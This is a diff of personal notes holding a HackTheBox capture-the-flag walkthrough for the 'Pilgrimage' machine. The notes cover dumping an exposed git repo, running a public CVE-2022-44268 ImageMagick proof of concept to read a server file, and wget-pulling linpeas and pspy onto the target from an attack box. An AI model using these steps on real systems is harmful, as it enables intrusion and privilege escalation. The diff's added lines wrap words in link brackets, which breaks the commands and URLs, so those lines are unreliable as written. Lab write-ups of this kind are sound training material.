@@ -118,7 +118,7 @@ Nmap done: 1 IP address (1 host up) scanned in 11.60 seconds
 
 - gitdumper exfils exposed github repos
 - [Gitdumper](https://github.com/arthaud/git-dumper)
-- `git-dumper http://pilgrimage.htb pilGitDump `
+- `git-dumper [[http]]://pilgrimage.[[htb]] pilGitDump `
 ```bash
  kali@kali  ~/htb/pilgrimage/pilvenv/pilvenv/pilGitDump   master  ll           
 total 27M
@@ -184,7 +184,7 @@ Shellcodes: No Results
 - Searching github for magick POC
 - https://github.com/voidz0r/CVE-2022-44268?tab=readme-ov-file
 - Clone the project
-- `git clone https://github.com/voidz0r/CVE-2022-44268`
+- `git clone [[https]]://github.com/voidz0r/[[CVE-2022-44268]]`
 - Run the project
 - `cargo run "/var/db/pilgrimage"`
 - Use the file at pilgrimage.htb
@@ -253,10 +253,10 @@ emily@pilgrimage:~$ find / -perm /4000 2>/dev/null
 ```
 
 - download linpeas on attack box if you don't have it already
-- ` ✘ kali@kali  ~  sudo apt install peass`
+- ` ✘ [[kali]]@[[kali]]  ~  sudo apt install peass`
 - navigate to /usr/share/peass/linpeas
 - spin up python server on attack machine
-- `python3 -m http.server`
+- `python3 -m [[http]].server`
 - pull down linpeas to target machine from attack machine 
 ```bash
 emily@pilgrimage:~$ wget http://10.10.16.12/linpeas.sh                                                                                
@@ -283,7 +283,7 @@ $ emily@pilgrimage:~$ /bin/bash linpeas.sh
 - I had to download `64 bit big, static version: pspy64` from the website 
 - then copy from downloads to `/usr/share`
 - navigate to `/usr/share` and 
-- spin up python server on attack machine `python3 -m http.server`
+- spin up python server on attack machine `python3 -m [[http]].server`
 - pull down pspy to target 
 ```bash
 emily@pilgrimage:/tmp$ wget http://10.10.16.12/pspy64                                                                                 
@@ -344,7 +344,7 @@ https://github.com/ReFirmLabs/binwalk
 
 
 - Gobuster to enumerate website if machine has 80 or 443
-	- `gobuster dir -u http://precious.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -o nameGobuster.txt -t 10`
+	- `gobuster dir -u [[http]]://precious.[[htb]] -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -o nameGobuster.txt -t 10`
 ```bash
 
 ```
@@ -360,7 +360,7 @@ https://github.com/ReFirmLabs/binwalk
 
 
 - search for exploits, RCEs, etc on service's versions running on those open ports
-	- SearchSploit
+	- [[SearchSploit]]
 	- Metaspolit
 	- document
 
